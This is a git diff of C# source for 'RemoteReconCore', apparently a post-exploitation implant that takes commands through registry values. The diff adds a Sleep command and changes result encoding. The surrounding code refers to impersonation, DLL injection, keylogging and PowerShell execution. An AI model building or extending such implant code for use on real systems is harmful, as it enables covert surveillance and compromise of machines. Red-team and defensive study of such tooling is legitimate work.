@@ -51,7 +51,7 @@ namespace RemoteReconCore
                         Console.WriteLine("Writing Impersonate command Result");
 #endif
                         rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
-                        rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                         rrbase.SetValue(commandkey, 0);
                         rrbase.SetValue(argumentkey, "");
                         command = new KeyValuePair<int, object>(0, "");
@@ -126,6 +126,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, string>(0, "");
                         break;
+                    case (int)Cmd.Sleep:
+#if DEBUG
+                        Console.WriteLine("Writing sleep command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -186,7 +197,7 @@ namespace RemoteReconCore
             }
             else if((int)Cmd.InjectDll == command.Key)
             {
-#if DEBUG 
+#if DEBUG
                 Console.WriteLine("Received DllInject command");
 #endif
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
@@ -214,6 +225,14 @@ namespace RemoteReconCore
                     result = new KeyValuePair<int, string>(7, msg);
                 }
             }
+            else if ((int)Cmd.Sleep == command.Key)
+            {
+                //Adjust the agents sleep 
+                int interval = Convert.ToInt32(command.Value);
+                sleep = interval;
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Sleep is set to " + interval));
+                result = new KeyValuePair<int, string>(0, msg);
+            }
         }
 
         //Some static class variables 
@@ -237,7 +256,8 @@ namespace RemoteReconCore
             PSFailed = 4,
             RevertFailed = 5,
             InjectDllFailed = 6,
-            KeylogStopFailed = 7
+            KeylogStopFailed = 7,
+            SleepFailed = 8
         }
 
         //Command enum 
@@ -250,7 +270,8 @@ namespace RemoteReconCore
             PowerShell = 4,
             Revert = 5,
             InjectDll = 6,
-            KeylogStop = 7
+            KeylogStop = 7,
+            Sleep = 8
         }
         
         //Helper function to patch the Native module with the appropriate command
